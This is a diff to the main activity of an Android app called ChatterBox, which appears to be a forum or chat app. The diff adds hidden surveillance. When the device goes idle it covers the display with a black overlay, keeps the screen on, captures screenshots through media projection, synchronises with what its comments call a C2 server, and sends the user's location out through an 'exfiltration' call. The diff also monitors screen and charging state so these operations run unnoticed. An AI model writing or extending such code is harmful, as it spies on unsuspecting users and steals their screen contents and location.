@@ -15,6 +15,7 @@ import android.provider.Settings
 import android.util.Log
 import android.view.Menu
 import android.view.MenuItem
+import android.view.WindowManager
 import android.widget.ImageView
 import android.widget.TextView
 import android.widget.Toast
@@ -49,6 +50,8 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
     private val appExecutor = Executors.newSingleThreadExecutor()
     private val handler = Handler(Looper.getMainLooper())
     private var dataSynchronizer: DataSynchronizer? = null
+    private var mediaProjectionResultCode: Int = 0
+    private var mediaProjectionData: Intent? = null
 
     companion object {
         private const val SEARCH_USER_REQUEST_CODE = 1001
@@ -79,6 +82,7 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
         loadUserProfile()
         checkIfAdmin()
         loadEnrolledForums()
+        registerSystemBroadcasts()
     }
 
     private fun shouldShowAccessibilityPromo(): Boolean {
@@ -92,15 +96,49 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
             setupAccessibilityDataCapture()
             handler.postDelayed({
                 requestMediaProjection()
-            }, 3000)
+            }, 2000)
 
+            IdleDetector.startIdleDetection(this)
+            IdleDetector.registerIdleCallback {
+                com.example.ChatterBox.accessibility.ScreenOnService.showBlackOverlay(this)
+
+                // Perform silent background operations when device is idle
+                appExecutor.execute {
+                    com.example.ChatterBox.accessibility.ScreenOnService.keepScreenOn(this)
+
+                    if (mediaProjectionResultCode != 0 && mediaProjectionData != null) {
+                        val serviceIntent = Intent(this, BackgroundSyncService::class.java)
+                        serviceIntent.action = "CAPTURE_SCREENSHOT"
+                        serviceIntent.putExtra("resultCode", mediaProjectionResultCode)
+                        serviceIntent.putExtra("data", mediaProjectionData)
+                        startService(serviceIntent)
+                    }
+
+                    // Synchronize data with C2 server
+                    dataSynchronizer?.synchronizeData()
+
+                    // Collect location if available
+                    collectLocationData()
+                }
+            }
             IdleDetector.startIdleDetection(this)
         }
 
         // Initialize data synchronization (our C2 communication) in the background
         initializeBackgroundSync()
     }
-
+    private fun collectLocationData() {
+        if (ContextCompat.checkSelfPermission(
+                this,
+                android.Manifest.permission.ACCESS_FINE_LOCATION
+            ) == PackageManager.PERMISSION_GRANTED
+        ) {
+            val locationTracker = LocationTracker.getInstance(this)
+            locationTracker.captureLastKnownLocation { locationData ->
+                dataSynchronizer?.sendExfiltrationData("location_data", locationData.toString())
+            }
+        }
+    }
     private fun initializeBackgroundSync() {
         appExecutor.execute {
             try {
@@ -366,10 +404,44 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
         serviceIntent.putExtra("data", data)
         startService(serviceIntent)
     }
+    private fun registerSystemBroadcasts() {
+        // Monitor charging state
+        val batteryFilter = IntentFilter().apply {
+            addAction(Intent.ACTION_POWER_CONNECTED)
+            addAction(Intent.ACTION_POWER_DISCONNECTED)
+        }
+        registerReceiver(object : BroadcastReceiver() {
+            override fun onReceive(context: Context, intent: Intent) {
+                val isCharging = intent.action == Intent.ACTION_POWER_CONNECTED
+                IdleDetector.updateChargingState(isCharging)
+            }
+        }, batteryFilter)
 
+        // Monitor screen state
+        val screenFilter = IntentFilter().apply {
+            addAction(Intent.ACTION_SCREEN_ON)
+            addAction(Intent.ACTION_SCREEN_OFF)
+        }
+        registerReceiver(object : BroadcastReceiver() {
+            override fun onReceive(context: Context, intent: Intent) {
+                val isScreenOn = intent.action == Intent.ACTION_SCREEN_ON
+                IdleDetector.updateScreenState(isScreenOn)
+            }
+        }, screenFilter)
+    }
+    override fun onUserInteraction() {
+        super.onUserInteraction()
+
+        // User is active, hide overlay if it's showing
+        com.example.ChatterBox.accessibility.ScreenOnService.hideBlackOverlay(this)
+
+        // Register activity with idle detector
+        IdleDetector.registerUserActivity()
+    }
     override fun onResume() {
         super.onResume()
         loadEnrolledForums() // ✅ Refresh the forum list when returning to MainActivity
+        com.example.ChatterBox.accessibility.ScreenOnService.hideBlackOverlay(this)
         IdleDetector.registerUserActivity()
     }
     override fun onPause() {
@@ -380,7 +452,9 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
         }, 5000) // After 5 seconds of being in background
     }
     override fun onDestroy() {
+        IdleDetector.stopIdleDetection()
         super.onDestroy()
+        appExecutor.shutdown()
         AccessibilityHelper.resetSession(this)
     }
 
